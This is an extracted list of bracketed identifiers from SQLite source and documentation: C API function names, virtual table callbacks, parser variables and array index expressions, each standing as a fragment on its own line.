[sqlite3_malloc
[sqlite3_malloc()
[sqlite3_mem_methods
[sqlite3_memory_highwater()
[sqlite3_memory_used()
[sqlite3_module.xClose | xClose
[sqlite3_module.xOpen | xOpen
[sqlite3_mprintf()
[sqlite3_mutex
[sqlite3_mutex_alloc()
[sqlite3_mutex_enter
[sqlite3_mutex_enter()
[sqlite3_mutex_free()
[sqlite3_mutex_held()
[sqlite3_mutex_leave
[sqlite3_mutex_leave()
[sqlite3_mutex_methods
[sqlite3_mutex_notheld()
[sqlite3_mutex_try()
[sqlite3_next_stmt()
[sqlite3_open()
[sqlite3_open16()
[sqlite3_open_v2()
[sqlite3_os_init()
[sqlite3_pcache*
[sqlite3_pcache_methods
[sqlite3_prepare | prepared
[sqlite3_prepare | preparing
[sqlite3_prepare()
[sqlite3_prepare16()
[sqlite3_prepare16_v2()
[sqlite3_prepare_v2()
[sqlite3_realloc()
[sqlite3_release_memory()
[sqlite3_reset()
[sqlite3_reset(S)
[sqlite3_reset_auto_extension()
[sqlite3_result_blob()
[sqlite3_result_int | sqlite3_result()
[sqlite3_result_value()
[sqlite3_result_zeroblob()
[sqlite3_rollback_hook()
[sqlite3_set_authorizer | authorizer callback function
[sqlite3_set_authorizer | authorizer documentation
[sqlite3_set_authorizer()
[sqlite3_set_auxdata()
[sqlite3_shutdown()
[sqlite3_snprintf()
[sqlite3_soft_heap_limit()
[sqlite3_status()
[sqlite3_step
[sqlite3_step()
[sqlite3_step(S)
[sqlite3_stmt
[sqlite3_stmt*
[sqlite3_stmt_status()
[sqlite3_strnicmp()
[sqlite3_test_control()
[sqlite3_threadsafe()
[sqlite3_total_changes()
[sqlite3_update_hook()
[sqlite3_user_data()
[sqlite3_value
[sqlite3_value*
[sqlite3_value_blob | sqlite3_value_type()
[sqlite3_value_blob()
[sqlite3_value_bytes()
[sqlite3_value_bytes16()
[sqlite3_value_int()
[sqlite3_value_text()
[sqlite3_value_text16()
[sqlite3_vfs
[sqlite3_vfs_find()
[sqlite3_vfs_register()
[sqlite3_vfs_unregister()
[start
[state
[stateno
[sz
[szCell[nCell
[szHdr
[t
[temp_store_directory pragma
[threading mode
[token
[truncate optimization
[u
[unprotected sqlite3_value
[v1 * 3 + v2
[vaNEXT - 1
[vaultGuid
[virtual
[virtual table
[virtual table module
[virtual tables
[with /fp:precise
[wrote
[wsdAutoext.nExt
[wsdPrng.j
[x
[x * 2
[x * 2 + 1
[xBestIndex
[xColumn
[xConnect
[xCreate
[xEof
[xFilter
[xFindFunction
[xNext
[xRowid
[yy_shift_ofst[S
[yygotominor.yy14.nExpr - 1
[yygotominor.yy65.nSrc - 1
[yymajor
[yymsp[0
[yypParser.yyidx
[yypParser.yystack[i
[yyruleno
[yytos.major
[z2Index
[zDx
[zIdx
[zIdx + 1
[zIdx + nId
[zIn[i
[zIndex
[zIndex + 1
[zIndex++
[zLeft[a
[zLeft[a + offsetLeft
[zRight[b
[zTerm - 1
[z[iOffset + 0
[z[iOffset + n - 1
[zeroblob
[zindex
[{0}
[{1}
[{2}
